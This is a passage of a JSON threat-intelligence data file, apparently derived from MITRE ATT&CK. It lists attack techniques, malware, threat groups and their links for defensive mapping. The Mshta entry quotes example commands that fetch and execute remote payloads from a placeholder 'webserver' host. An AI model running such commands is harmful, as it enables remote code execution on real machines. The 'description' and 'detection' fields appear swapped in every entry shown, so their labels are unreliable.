            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Dynamic Linker Hijacking",
                "chain_phase": "persistence",
                "description": "Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program. ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1556",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Modify Authentication Process",
                "chain_phase": "credential-access",
                "description": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "detection": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ]
            }
        },
        {
            "id": "T1554",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Compromise Client Software Binary",
                "chain_phase": "persistence",
                "description": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.",
                "detection": "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Private Keys",
                "chain_phase": "credential-access",
                "description": "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.",
                "detection": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1020",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Automated Exfiltration",
                "chain_phase": "exfiltration",
                "description": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.",
                "detection": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "S0377",
            "type": "tool",
            "attributes": {
                "name": "Ebury",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Ebury is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).",
                "platforms": [
                    "Linux"
                ]
            },
            "val": 20,
            "techniques": [
                "T1556.003",
                "T1556",
                "T1140",
                "T1059.006",
                "T1020",
                "T1083",
                "T1573.001",
                "T1041",
                "T1562.006",
                "T1132.001",
                "T1014",
                "T1071.004",
                "T1574.006",
                "T1568.002",
                "T1553.002",
                "T1554",
                "T1562.001",
                "T1008",
                "T1027",
                "T1552.004"
            ]
        },
        {
            "id": "G0123",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Volatile Cedar",
                "aliases": [
                    "Lebanese Cedar"
                ],
                "description": "Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests.",
                "tools": [
                    "S0572",
                    "S0569"
                ],
                "techniques": [
                    "T1595.002",
                    "T1505.003",
                    "T1190",
                    "T1105"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1069.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Local Groups",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1110",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Brute Force",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.",
                "detection": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0572",
            "type": "tool",
            "attributes": {
                "name": "Caterpillar WebShell",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Caterpillar WebShell is a self-developed Web Shell tool created by the group Volatile Cedar. ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 15,
            "techniques": [
                "T1033",
                "T1112",
                "T1014",
                "T1041",
                "T1046",
                "T1016",
                "T1005",
                "T1059.003",
                "T1110",
                "T1069.001",
                "T1057",
                "T1007",
                "T1082",
                "T1083",
                "T1105"
            ]
        },
        {
            "id": "T1564.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Hidden Files and Directories",
                "chain_phase": "defense-evasion",
                "description": "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.",
                "detection": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1115",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Clipboard Data",
                "chain_phase": "collection",
                "description": "Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.",
                "detection": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API. OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1025",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Data from Removable Media",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0569",
            "type": "tool",
            "attributes": {
                "name": "Explosive",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Explosive is a custom-made remote access tool used by the group Volatile Cedar. It was first identified in the wild in 2015.  ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 12,
            "techniques": [
                "T1033",
                "T1112",
                "T1564.001",
                "T1016",
                "T1106",
                "T1056.001",
                "T1025",
                "T1105",
                "T1071.001",
                "T1573.001",
                "T1082",
                "T1115"
            ]
        },
        {
            "id": "G0122",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Silent Librarian",
                "aliases": [
                    "TA407",
                    "COBALT DICKENS"
                ],
                "description": "Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of  Silent Librarian are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).",
                "tools": [],
                "techniques": [
                    "T1608.005",
                    "T1598.003",
                    "T1594",
                    "T1589.003",
                    "T1589.002",
                    "T1588.004",
                    "T1588.002",
                    "T1585.002",
                    "T1583.001",
                    "T1114.003",
                    "T1110.003",
                    "T1114",
                    "T1078"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "G0121",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Sidewinder",
                "aliases": [
                    "T-APT-04",
                    "Rattlesnake"
                ],
                "description": "Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.",
                "tools": [
                    "S0250"
                ],
                "techniques": [
                    "T1598.003",
                    "T1598.002",
                    "T1059.007",
                    "T1071.001",
                    "T1074.001",
                    "T1574.002",
                    "T1204.002",
                    "T1204.001",
                    "T1059.005",
                    "T1059.001",
                    "T1566.002",
                    "T1566.001",
                    "T1518.001",
                    "T1559.002",
                    "T1036.005",
                    "T1547.001",
                    "T1218.005",
                    "T1518",
                    "T1203",
                    "T1124",
                    "T1119",
                    "T1105",
                    "T1083",
                    "T1082",
                    "T1057",
                    "T1033",
                    "T1027",
                    "T1020",
                    "T1016"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1003.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "NTDS",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.",
                "detection": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Mshta",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
                "detection": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https://webserver/payload.sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0250",
            "type": "tool",
            "attributes": {
                "name": "Koadic",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Koadic is a Windows post-exploitation framework and penetration testing tool. Koadic is publicly available on GitHub and the tool is executed via the command-line. Koadic has several options for staging payloads and creating implants. Koadic performs most of its operations using Windows Script Host.  ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 20,
            "techniques": [
                "T1033",
                "T1047",
                "T1548.002",
                "T1059.005",
                "T1218.011",
                "T1115",
                "T1016",
                "T1003.002",
                "T1135",
                "T1003.003",
                "T1573.002",
                "T1218.005",
                "T1569.002",
                "T1055.001",
                "T1105",
                "T1046",
                "T1005",
                "T1021.001",
                "T1059.003",
                "T1218.010"
            ]
        }
    ],
    "links": [
        {
            "source": "S0225",
            "target": "T1190"
        },
        {
            "source": "G0130",
            "target": "S0225"
        },
        {
            "source": "S0224",
            "target": "T1190"
        },
        {
            "source": "G0130",
            "target": "S0224"
        },
        {
            "source": "S0590",
            "target": "T1046"
        },
        {
            "source": "S0590",
            "target": "T1040"
        },
        {
            "source": "S0590",
            "target": "T1033"
        },
        {
            "source": "S0590",
            "target": "T1018"
        },
        {
            "source": "S0590",
            "target": "T1016"
        },
        {
            "source": "G0129",
            "target": "S0590"
        },
        {
            "source": "S0154",
            "target": "T1059.007"
        },
        {
            "source": "S0154",
            "target": "T1027.005"
        },
        {
            "source": "S0154",
            "target": "T1573.002"
        },
        {
            "source": "S0154",
            "target": "T1573.001"
        },
        {
            "source": "S0154",
            "target": "T1071.004"
        },
        {
            "source": "S0154",
            "target": "T1071.001"
        },
        {
            "source": "S0154",
            "target": "T1572"
        },
        {
            "source": "S0154",
            "target": "T1090.001"
        },
        {
            "source": "S0154",
            "target": "T1078.003"
        },
        {
            "source": "S0154",
            "target": "T1078.002"
        },
        {
            "source": "S0154",
            "target": "T1569.002"
        },
        {
            "source": "S0154",
            "target": "T1059.006"
        },
        {
            "source": "S0154",
            "target": "T1059.005"
        },
        {
            "source": "S0154",
            "target": "T1059.003"
        },
        {
            "source": "S0154",
            "target": "T1059.001"
        },
        {
            "source": "S0154",
            "target": "T1087.002"
        },
        {
            "source": "S0154",
            "target": "T1562.001"
        },
        {
            "source": "S0154",
            "target": "T1134.004"
        },
        {
            "source": "S0154",
            "target": "T1134.003"
        },
        {
            "source": "S0154",
            "target": "T1134.001"
        },
        {
            "source": "S0154",
            "target": "T1056.001"
        },
        {
            "source": "S0154",
            "target": "T1003.002"
        },
        {
            "source": "S0154",
            "target": "T1021.006"
        },
        {
            "source": "S0154",
            "target": "T1021.004"
        },
        {
            "source": "S0154",
            "target": "T1021.003"
        },
        {
            "source": "S0154",
            "target": "T1021.002"
        },
        {
            "source": "S0154",
            "target": "T1021.001"
        },
        {
            "source": "S0154",
            "target": "T1553.002"
        },
        {
            "source": "S0154",
            "target": "T1070.006"
        },
        {
            "source": "S0154",
            "target": "T1550.002"
        },
        {
            "source": "S0154",
            "target": "T1548.002"
        },
        {
            "source": "S0154",
            "target": "T1543.003"
        },
        {
            "source": "S0154",
            "target": "T1055.012"
        },
        {
            "source": "S0154",
            "target": "T1055.001"
        },
        {
            "source": "S0154",
            "target": "T1137.001"
        },
        {
            "source": "S0154",
            "target": "T1197"
        },
        {
            "source": "S0154",
            "target": "T1203"
        },
        {
            "source": "S0154",
            "target": "T1185"
        },
        {
            "source": "S0154",
            "target": "T1140"
        },
        {
            "source": "S0154",
            "target": "T1135"
        },
        {
            "source": "S0154",
            "target": "T1113"
        },
        {
            "source": "S0154",
            "target": "T1112"
        },
        {
            "source": "S0154",
            "target": "T1106"
        },
        {
            "source": "S0154",
            "target": "T1105"
        },
        {
            "source": "S0154",
            "target": "T1095"
        },
        {
            "source": "S0154",
            "target": "T1071"
        },
        {
            "source": "S0154",
            "target": "T1068"
        },
        {
            "source": "S0154",
            "target": "T1057"
        },
        {
            "source": "S0154",
            "target": "T1055"
        },
        {
            "source": "S0154",
            "target": "T1049"
        },
        {
            "source": "S0154",
            "target": "T1047"
        },
        {
            "source": "S0154",
            "target": "T1046"
        },
        {
            "source": "S0154",
            "target": "T1043"
        },
        {
            "source": "S0154",
            "target": "T1029"
        },
        {
            "source": "S0154",
            "target": "T1027"
        },
        {
            "source": "S0154",
            "target": "T1026"
        },
        {
            "source": "S0154",
            "target": "T1018"
        },
        {
            "source": "S0154",
            "target": "T1016"
        },
        {
            "source": "S0154",
            "target": "T1012"
        },
        {
            "source": "S0154",
            "target": "T1005"
        },
        {
            "source": "G0129",
            "target": "S0154"
        },
        {
            "source": "S0013",
            "target": "T1127.001"
        },
        {
            "source": "S0013",
            "target": "T1071.004"
        },
        {
            "source": "S0013",
            "target": "T1071.001"
        },
        {
            "source": "S0013",
            "target": "T1102.001"
        },
        {
            "source": "S0013",
            "target": "T1574.002"
        },
        {
            "source": "S0013",
            "target": "T1059.003"
        },
        {
            "source": "S0013",
            "target": "T1497.001"
        },
        {
            "source": "S0013",
            "target": "T1056.001"
        },
        {
            "source": "S0013",
            "target": "T1036.004"
        },
        {
            "source": "S0013",
            "target": "T1547.001"
        },
        {
            "source": "S0013",
            "target": "T1543.003"
        },
        {
            "source": "S0013",
            "target": "T1140"
        },
        {
            "source": "S0013",
            "target": "T1135"
        },
        {
            "source": "S0013",
            "target": "T1113"
        },
        {
            "source": "S0013",
            "target": "T1112"
        },
        {
            "source": "S0013",
            "target": "T1106"
        },
        {
            "source": "S0013",
            "target": "T1105"
        },
        {
            "source": "S0013",
            "target": "T1095"
        },
        {
            "source": "S0013",
            "target": "T1094"
        },
        {
            "source": "S0013",
            "target": "T1083"
        },
        {
            "source": "S0013",
            "target": "T1057"
        },
        {
            "source": "S0013",
            "target": "T1049"
        },
        {
            "source": "S0013",
            "target": "T1043"
        },
        {
            "source": "S0013",
            "target": "T1026"
        },
        {
            "source": "S0013",
            "target": "T1012"
        },
        {
            "source": "G0129",
            "target": "S0013"
        },
        {
            "source": "S0012",
            "target": "T1547.014"
        },
        {
            "source": "S0012",
            "target": "T1573.001"
        },
        {
            "source": "S0012",
            "target": "T1074.001"
        },
        {
            "source": "S0012",
            "target": "T1059.003"
        },
        {
            "source": "S0012",
            "target": "T1056.001"
        },
        {
            "source": "S0012",
            "target": "T1547.001"
        },
        {
            "source": "S0012",
            "target": "T1543.003"
        },
        {
            "source": "S0012",
            "target": "T1055.001"
        },
        {
            "source": "S0012",
            "target": "T1112"
        },
        {
            "source": "S0012",
            "target": "T1105"
        },
        {
            "source": "S0012",
            "target": "T1065"
        },
        {
            "source": "S0012",
            "target": "T1027"
        },
        {
            "source": "S0012",
            "target": "T1014"
        },
        {
            "source": "S0012",
            "target": "T1010"
        },
        {
            "source": "S0012",
            "target": "T1005"
        },
        {
            "source": "G0129",
            "target": "S0012"
        },
        {
            "source": "S0483",
            "target": "T1573.002"
        },
        {
            "source": "S0483",
            "target": "T1071.001"
        },
        {
            "source": "S0483",
            "target": "T1204.002"
        },
        {
            "source": "S0483",
            "target": "T1059.005"
        },
        {
            "source": "S0483",
            "target": "T1566.001"
        },
        {
            "source": "S0483",
            "target": "T1087.002"
        },
        {
            "source": "S0483",
            "target": "T1027.003"
        },
        {
            "source": "S0483",
            "target": "T1027.002"
        },
        {
            "source": "S0483",
            "target": "T1218.007"
        },
        {
            "source": "S0483",
            "target": "T1547.001"
        },
        {
            "source": "S0483",
            "target": "T1055.004"
        },
        {
            "source": "S0483",
            "target": "T1053.005"
        },
        {
            "source": "S0483",
            "target": "T1185"
        },
        {
            "source": "S0483",
            "target": "T1106"
        },
        {
            "source": "S0483",
            "target": "T1105"
        },
        {
            "source": "S0483",
            "target": "T1082"
        },
        {
            "source": "S0483",
            "target": "T1069"
        },
        {
            "source": "S0483",
            "target": "T1047"
        },
        {
            "source": "S0483",
            "target": "T1027"
        },
        {
            "source": "G0127",
            "target": "S0483"
        },
        {
            "source": "S0476",
            "target": "T1555.004"
        },
        {
            "source": "S0476",
            "target": "T1059.007"
        },
        {
            "source": "S0476",
            "target": "T1071.001"
        },
        {
            "source": "S0476",
            "target": "T1132.001"
        },
        {
            "source": "S0476",
            "target": "T1564.004"
        },
        {
            "source": "S0476",
            "target": "T1204.002"
        },
        {
            "source": "S0476",
            "target": "T1059.001"
        },
        {
            "source": "S0476",
            "target": "T1566.002"
        },
        {
            "source": "S0476",
            "target": "T1566.001"
        },
        {
            "source": "S0476",
            "target": "T1518.001"
        },
        {
            "source": "S0476",
            "target": "T1087.002"
        },
        {
            "source": "S0476",
            "target": "T1087.001"
        },
        {
            "source": "S0476",
            "target": "T1114.002"
        },
        {
            "source": "S0476",
            "target": "T1559.002"
        },
        {
            "source": "S0476",
            "target": "T1027.002"
        },
        {
            "source": "S0476",
            "target": "T1552.002"
        },
        {
            "source": "S0476",
            "target": "T1218.010"
        },
        {
            "source": "S0476",
            "target": "T1053.005"
        },
        {
            "source": "S0476",
            "target": "T1140"
        },
        {
            "source": "S0476",
            "target": "T1119"
        },
        {
            "source": "S0476",
            "target": "T1113"
        },
        {
            "source": "S0476",
            "target": "T1112"
        },
        {
            "source": "S0476",
            "target": "T1105"
        },
        {
            "source": "S0476",
            "target": "T1104"
        },
        {
            "source": "S0476",
            "target": "T1082"
        },
        {
            "source": "S0476",
            "target": "T1057"
        },
        {
            "source": "S0476",
            "target": "T1047"
        },
        {
            "source": "S0476",
            "target": "T1041"
        },
        {
            "source": "S0476",
            "target": "T1033"
        },
        {
            "source": "S0476",
            "target": "T1027"
        },
        {
            "source": "S0476",
            "target": "T1016"
        },
        {
            "source": "S0476",
            "target": "T1012"
        },
        {
            "source": "S0476",
            "target": "T1008"
        },
        {
            "source": "G0127",
            "target": "S0476"
        },
        {
            "source": "S0386",
            "target": "T1071.001"
        },
        {
            "source": "S0386",
            "target": "T1090.003"
        },
        {
            "source": "S0386",
            "target": "T1074.001"
        },
        {
            "source": "S0386",
            "target": "T1564.003"
        },
        {
            "source": "S0386",
            "target": "T1568.002"
        },
        {
            "source": "S0386",
            "target": "T1059.005"
        },
        {
            "source": "S0386",
            "target": "T1059.001"
        },
        {
            "source": "S0386",
            "target": "T1497.003"
        },
        {
            "source": "S0386",
            "target": "T1559.001"
        },
        {
            "source": "S0386",
            "target": "T1056.004"
        },
        {
            "source": "S0386",
            "target": "T1036.005"
        },
        {
            "source": "S0386",
            "target": "T1070.004"
        },
        {
            "source": "S0386",
            "target": "T1547.001"
        },
        {
            "source": "S0386",
            "target": "T1543.003"
        },
        {
            "source": "S0386",
            "target": "T1055.012"
        },
        {
            "source": "S0386",
            "target": "T1055.005"
        },
        {
            "source": "S0386",
            "target": "T1185"
        },
        {
            "source": "S0386",
            "target": "T1140"
        },
        {
            "source": "S0386",
            "target": "T1132"
        },
        {
            "source": "S0386",
            "target": "T1113"
        },
        {
            "source": "S0386",
            "target": "T1112"
        },
        {
            "source": "S0386",
            "target": "T1106"
        },
        {
            "source": "S0386",
            "target": "T1105"
        },
        {
            "source": "S0386",
            "target": "T1094"
        },
        {
            "source": "S0386",
            "target": "T1091"
        },
        {
            "source": "S0386",
            "target": "T1090"
        },
        {
            "source": "S0386",
            "target": "T1082"
        },
        {
            "source": "S0386",
            "target": "T1080"
        },
        {
            "source": "S0386",
            "target": "T1057"
        },
        {
            "source": "S0386",
            "target": "T1047"
        },
        {
            "source": "S0386",
            "target": "T1041"
        },
        {
            "source": "S0386",
            "target": "T1027"
        },
        {
            "source": "S0386",
            "target": "T1012"
        },
        {
            "source": "S0386",
            "target": "T1007"
        },
        {
            "source": "S0386",
            "target": "T1005"
        },
        {
            "source": "G0127",
            "target": "S0386"
        },
        {
            "source": "S0160",
            "target": "T1553.004"
        },
        {
            "source": "S0160",
            "target": "T1140"
        },
        {
            "source": "S0160",
            "target": "T1105"
        },
        {
            "source": "G0126",
            "target": "S0160"
        },
        {
            "source": "S0032",
            "target": "T1573.001"
        },
        {
            "source": "S0032",
            "target": "T1573"
        },
        {
            "source": "S0032",
